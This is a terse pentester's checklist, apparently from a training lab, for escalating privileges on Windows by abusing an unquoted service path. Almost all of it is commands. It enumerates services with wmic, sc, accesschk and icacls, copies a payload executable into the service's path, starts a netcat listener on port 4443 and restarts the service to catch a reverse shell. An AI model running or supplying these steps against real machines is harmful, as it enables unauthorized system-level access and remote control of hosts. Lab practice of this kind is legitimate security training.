(checklist)

- port scan
- version scan
- service scan

COMMANDS:
wmic service get name,pathname,startmode|findstr /i  /v C:\Windows\\

wmic service get name,pathname,startmode  |findstr /i  /v  C:\Windows\\| findstr  /i /v """

sc qc unquotedsvc

C:\Users\user\Desktop\Tools\accesschk64.exe -ucqv user /user unquotedsvc

icacls "C:\Program Files\Unquoted Path Service\Common Files"

icacls "C:\Program Files\Unquoted Path Service"

copy payload.exe "C:\Program Files\Unquoted Path Service\common.exe"

nc -nlvp 4443

net start unquotedsvc

go back to listening terminal